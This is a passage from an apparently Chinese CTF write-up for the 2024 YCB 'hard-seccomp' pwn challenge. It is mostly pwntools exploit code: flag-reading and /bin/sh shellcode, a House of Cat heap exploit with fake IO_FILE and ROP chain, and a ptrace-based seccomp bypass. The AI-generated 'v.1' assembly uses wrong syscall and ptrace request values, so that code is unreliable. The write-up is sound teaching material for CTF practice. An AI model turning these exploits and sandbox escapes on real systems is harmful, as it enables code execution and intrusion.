class="line"></span><br><span class="line">opennat=asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov r15,rdx</span></span><br><span class="line"><span class="string">mov rax,101</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rdi,0x67616c662f2e  </span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">mov rdi,rsp </span></span><br><span class="line"><span class="string">mov rsi,0 </span></span><br><span class="line"><span class="string">mov rdx,0 </span></span><br><span class="line"><span class="string">mov rax,2</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,r15</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rax,101</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">mov rdi,0</span></span><br><span class="line"><span class="string">mov rsp,r15</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">mov rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">mov rax,0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">short_shellcode=<span class="string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">shellcodeQWQ=[shellcode1,shellcode2,shellcode3]</span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *(rebase +0x1a14)&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;do what you feel is right!&quot;</span>)</span><br><span class="line">p.send(opennat)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>然后打印出来的东西就是flag的大端小端反写，之后就是找工具转译了。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1724511366296-7019bbcc-9ce3-46b8-bea3-c939ba7f99f9.png" alt="img"></p><h2 id="2024-YCB-hard-seccomp"><a href="#2024-YCB-hard-seccomp" class="headerlink" title="2024 YCB hard-seccomp"></a>2024 YCB hard-seccomp</h2><p>参考：<a href="https://www.kernel.org/doc/html/latest/translations/zh_CN/userspace-api/seccomp_filter.html">Seccomp BPF (基于过滤器的安全计算) — The Linux Kernel documentation</a></p><p>参考：[羊城杯 2024 pwn writeup (qanux.github.io)](<a href="https://qanux.github.io/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF">https://qanux.github.io/2024/08/28/羊城杯</a> 2024 pwn writeup&#x2F;index.html)</p><p>参考：<a href="https://www.onitroad.com/jc/linux/man-pages/linux/man2/ptrace.2.html">PTRACE - Linux手册页-之路教程 (onitroad.com)</a></p><p>题目是一个简单堆题，这里house of cat进行了控制程序流，到我们可以写入shellcode到执行shellcode的脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(log_level=<span class="string">&quot;debug&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span></span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;49.234.30.109&quot;</span>,9999)</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">cmd</span><span class="params">(i)</span>:</span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;&gt;&quot;</span>,str(i))</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">add</span><span class="params">(idx,size)</span>:</span><br><span class="line"><span class="title function_">cmd</span><span class="params">(<span class="number">1</span>)</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Size: &quot;</span>,str(size))</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">free</span><span class="params">(idx)</span>:</span><br><span class="line"><span class="title function_">cmd</span><span class="params">(<span class="number">2</span>)</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">edit</span><span class="params">(idx,con)</span>:</span><br><span class="line"><span class="title function_">cmd</span><span class="params">(<span class="number">3</span>)</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Content: &quot;</span>,con)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_">show</span><span class="params">(idx)</span>:</span><br><span class="line"><span class="title function_">cmd</span><span class="params">(<span class="number">4</span>)</span></span><br><span class="line">p.<span class="title function_">sendlineafter</span><span class="params">(<span class="string">&quot;Index: &quot;</span>,str(idx))</span></span><br><span class="line"></span><br><span class="line">libcversion=<span class="string">&quot;235&quot;</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x530</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x520</span>)#old1</span><br><span class="line"><span class="title function_">show</span><span class="params">(<span class="number">0</span>)</span></span><br><span class="line">libc_addr=u64(p.recv(<span class="number">6</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x530</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x530</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">print(<span class="string">&quot;heap_addr&quot;</span>,hex(heap_addr))</span><br><span class="line">heapbase=heap_addr<span class="number">-0xcf0</span></span><br><span class="line">print(<span class="string">&quot;libc_addr&quot;</span>,hex(libc_addr))</span><br><span class="line"><span class="keyword">if</span> libcversion==<span class="string">&quot;236&quot;</span>:</span><br><span class="line">main_arena=libc_addr<span class="number">-1504</span></span><br><span class="line">_IO_list_all=main_arena+<span class="number">0xA00</span></span><br><span class="line">libcbase=_IO_list_all<span class="number">-0x000001f7660</span></span><br><span class="line">_IO_list_all=libcbase+<span class="number">0x01f7660</span></span><br><span class="line">openat2=libcbase+<span class="number">0x00010cb50</span></span><br><span class="line">read=libcbase+<span class="number">0x010cce0</span></span><br><span class="line">write=libcbase+<span class="number">0x0010cd80</span></span><br><span class="line">IO_wfile_jumps=libcbase+<span class="number">0x001f30a0</span></span><br><span class="line">setcontext=libcbase+<span class="number">0x041c00</span></span><br><span class="line">pop_rdi=libcbase+<span class="number">0x0023b65</span></span><br><span class="line">pop_rsi=libcbase+<span class="number">0x251be</span></span><br><span class="line">pop_rdx=libcbase+<span class="number">0x166262</span></span><br><span class="line">pop_rdx_rcx_rbx=libcbase+<span class="number">0x00101353</span></span><br><span class="line">pop_rbp=libcbase+<span class="number">0x023a60</span></span><br><span class="line">fd=libcbase+<span class="number">0x21B110</span></span><br><span class="line">mprotect=libcbase+<span class="number">0x000116e60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">main_arena=libc_addr<span class="number">-1504</span></span><br><span class="line">_IO_list_all=main_arena+<span class="number">0xa00</span></span><br><span class="line">libcbase=_IO_list_all<span class="number">-0x021b680</span></span><br><span class="line">_open=libcbase+<span class="number">0x001144e0</span></span><br><span class="line">openat2=libcbase+<span class="number">0x00000114640</span></span><br><span class="line">_write=libcbase+<span class="number">0x0114870</span></span><br><span class="line">_read=libcbase+<span class="number">0x0001147d0</span></span><br><span class="line">_IO_wfile_overflow =libcbase+<span class="number">0X0000086390</span></span><br><span class="line">IO_wfile_jumps=libcbase+<span class="number">0x0000000002170c0</span></span><br><span class="line">setcontext =libcbase+<span class="number">0x0000000539e0</span></span><br><span class="line">pop_rdi=libcbase+<span class="number">0x02a3e5</span></span><br><span class="line">pop_rsi=libcbase+<span class="number">0x171a12</span></span><br><span class="line">pop_rdx_rcx_rbx=libcbase+<span class="number">0X108b03</span></span><br><span class="line">pop_rdx_r12=libcbase+<span class="number">0x011f2e7</span></span><br><span class="line">sendmsg=libcbase+<span class="number">0x00000127950</span></span><br><span class="line">recvmsg=libcbase+<span class="number">0x00001277e0</span></span><br><span class="line">mprotect=libcbase+<span class="number">0x0011eaa0</span></span><br><span class="line">fd=libcbase+<span class="number">0x21B110</span></span><br><span class="line">pop_rsp_rbp=libcbase+<span class="number">0x0133b30</span></span><br><span class="line">pop_rbp=libcbase+<span class="number">0x0002a2e0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line"></span><br><span class="line">new_addr=heapbase+<span class="number">0x1210</span></span><br><span class="line">heapaddr=heapbase+<span class="number">0x290</span></span><br><span class="line">edit(<span class="number">0</span>,p64(fd)*<span class="number">2</span>+p64(heap_addr)+p64(_IO_list_all<span class="number">-0x20</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)#<span class="number">2</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x530</span>)</span><br><span class="line">iu=<span class="keyword">asm</span>(<span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 425</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">stack_heap=heapbase+<span class="number">0x2000</span>+<span class="number">0x650</span></span><br><span class="line">fake_io_addr=heapbase+<span class="number">0xcf0</span> # 伪造的fake_IO结构体的地址</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(<span class="number">0x0</span>)#这个并不是_flag也不是rdi         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="meta"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x100</span>)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(setcontext+<span class="number">61</span>)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x400</span>)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="meta">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span><span class="number">-0x10</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_wfile_jumps+<span class="number">0x30</span>)  <span class="meta"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  # rax2_addr</span><br><span class="line">fake_IO_FILE+=b<span class="string">&quot;./flag\x00\x00&quot;</span></span><br><span class="line">qwq=b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>*<span class="number">0x68</span>+p64(fake_io_addr+<span class="number">0xF8</span>)+p64(fake_io_addr+<span class="number">0x200</span>)+p64(fake_io_addr+<span class="number">0x200</span>)</span><br><span class="line">qwq+=p64(fake_io_addr+<span class="number">0x200</span>)+p64(pop_rdi)</span><br><span class="line">qwq=qwq.ljust(<span class="number">0xa0</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">qwq+=p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0xdeadbeef</span>)+b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">ROP=p64(pop_rdi)+p64(heapbase+<span class="number">0x1000</span>)+p64(pop_rsi)+p64(<span class="number">0x2000</span>)+p64(pop_rdx_rcx_rbx)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(mprotect)+p64(pop_rbp)+p64(stack_heap+<span class="number">0x488</span>)+p64(new_addr+<span class="number">0x10</span>)<span class="meta">#</span></span><br><span class="line"><span class="meta">qwq+=ROP</span></span><br><span class="line">fake_IO_FILE+=qwq</span><br><span class="line"><span class="meta">#gdb.attach()</span></span><br><span class="line">edit(<span class="number">2</span>,fake_IO_FILE)</span><br><span class="line"><span class="meta">#gdb.attach(p,<span class="string">&quot;b _IO_switch_to_wget_mode&quot;</span>)</span></span><br><span class="line">edit(<span class="number">4</span>,shellcode)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x900</span>)</span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;libc_addr&quot;</span>,hex(libc_addr))</span><br><span class="line">print(<span class="string">&quot;libcbase:&quot;</span>,hex(libcbase))</span><br><span class="line">print(<span class="string">&quot;heapbase:&quot;</span>,hex(heapbase))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>程序的沙盒状态如下</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1726111417293-c9c0dab2-a03b-43ef-8077-3c444b56027c.png" alt="img"></p><p>一开始本来想用openat2，但是因为Linux内核5.6才有openat2的引入，远程发现是5.4的版本左右，所以是不支持openat2的。</p><p>不清楚本地的flag是否在当前目录下，..&#x2F;  &#x2F;  ..&#x2F;..&#x2F;目录我都找过，但是无济于事</p><p>所以只能另辟蹊径，一开始聚焦于io_uring的利用，但是本人没有仔细研究，所以抄了几家shellcode也就放弃了，听Qanux师傅说本地能通，但是远程不能通。回到沙盒状态，我们注意到被禁用的系统调用并不是直接kill，而是一个TRACE，这意味着如果我们可能追踪回这个进程并加以利用。</p><p>如何做？</p><p>我们需要用ptrace系统调用（系统调用号：101）去追回，下面是我们暂停seccomp所需要的request和对应的选项</p><p><strong>PTRACE_SETOPTIONS</strong>(since Linux 2.4.6; see BUGS for caveats)</p><p><strong>PTRACE_O_SUSPEND_SECCOMP</strong>(since Linux 4.3)选项</p><p>暂停tracee的seccomp保护。这适用于任何模式，并且可以在示踪尚未安装seccomp筛选器时使用。也就是说，一个有效的用例是在被跟踪安装之前，暂停被跟踪的seccomp保护，让被跟踪安装过滤器，然后在恢复过滤器时清除此标志。设置此选项要求跟踪器具有CAP_SYS_ADMIN功能，未安装任何seccomp保护，并且自身未设置PTRACE_O_SUSPEND_SECCOMP。</p><p>那我们的代码执行流程就有了，首先fork一个子进程，我们尝试在子进程中执行execve的代码</p><p>然后父进程wait等待子进程返回信号，如果返回信号应该是子进程的TRACEME选项起作用了，下一句就是execve的代码。父进程此时attach过去接管子进程，然后顺便把子进程的沙盒关了，那么我们此时的子进程就会执行execve不受阻拦并替代为对应的shell。</p><h3 id="shellcode-v-1"><a href="#shellcode-v-1" class="headerlink" title="shellcode v.1"></a>shellcode v.1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pid = fork()</span><br><span class="line"><span class="keyword">if</span> (!pid)</span><br><span class="line">&#123;<span class="comment">//子进程</span></span><br><span class="line">    ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    execve(<span class="string">&quot;/bin/sh\x00&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//父进程</span></span><br><span class="line">    waitpid(pid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    ptrace(PTRACE_ATTACH,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    ptrace(PTRACE_O_SUSPEND_SECCOMP,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">    ptrace(PTRACE_CONT,pid,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是AI根据我们伪代码写的汇编代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">_start:</span><br><span class="line">    ; fork() system call</span><br><span class="line">    mov rax, <span class="number">57</span>          ; syscall number <span class="keyword">for</span> <span class="title function_">fork</span><span class="params">()</span></span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax        ; check <span class="keyword">if</span> the result is <span class="number">0</span></span><br><span class="line">    mov r15,rax</span><br><span class="line">    jz child_process     ; jump to child process code <span class="keyword">if</span> result is <span class="number">0</span></span><br><span class="line"></span><br><span class="line">parent_process:</span><br><span class="line">    ; waitpid() system call</span><br><span class="line">    mov rax, <span class="number">7</span>          ; syscall number <span class="keyword">for</span> <span class="title function_">waitpid</span><span class="params">()</span></span><br><span class="line">    mov rdi, r15        ; pid (use the pid from fork)</span><br><span class="line">    xor rsi, rsi        ; options</span><br><span class="line">    xor rdx, rdx        ; status</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 16         ; request type PTRACE_ATTACH</span><br><span class="line">    mov rsi, r15        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; ptrace(PTRACE_O_SUSPEND_SECCOMP, pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 0x42000003 ; request type PTRACE_O_SUSPEND_SECCOMP</span><br><span class="line">    mov rsi, r15        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; ptrace(PTRACE_COUT, pid, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 0x7; request type PTRACE_O_SUSPEND_SECCOMP</span><br><span class="line">    mov rsi, r15        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; Exit</span><br><span class="line">    mov rax, <span class="number">60</span>         ; syscall number <span class="keyword">for</span> <span class="title function_">exit</span><span class="params">()</span></span><br><span class="line">    xor rdi, rdi        ; status</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    ; ptrace(TRACE_ME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    mov rax, <span class="number">257</span>        ; syscall number <span class="keyword">for</span> <span class="title function_">ptrace</span><span class="params">()</span></span><br><span class="line">    mov rdi, 0          ; request type TRACE_ME</span><br><span class="line">    xor rsi, rsi        ; pid</span><br><span class="line">    xor rdx, rdx        ; address</span><br><span class="line">    xor r10, r10        ; data</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>)</span><br><span class="line">    mov rax, <span class="number">59</span>         ; syscall number <span class="keyword">for</span> <span class="title function_">execve</span><span class="params">()</span></span><br><span class="line">    push 0              ; <span class="literal">NULL</span> <span class="keyword">for</span> envp</span><br><span class="line">    push <span class="number">0</span>              ; <span class="literal">NULL</span> <span class="keyword">for</span> argv</span><br><span class="line">    mov rbx, <span class="number">0x68732f6e69622f</span> ; <span class="string">&quot;/bin//sh&quot;</span> in reverse</span><br><span class="line">    push rbx            ; push the address of <span class="string">&quot;/bin//sh&quot;</span> onto the <span class="built_in">stack</span></span><br><span class="line">    mov rdi, rsp        ; pointer to the argument <span class="built_in">array</span></span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    ; Exit <span class="keyword">if</span> execve fails</span><br><span class="line">    mov rax, <span class="number">60</span>         ; syscall number <span class="keyword">for</span> <span class="title function_">exit</span><span class="params">()</span></span><br><span class="line">    xor rdi, rdi        ; status</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>去注释版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 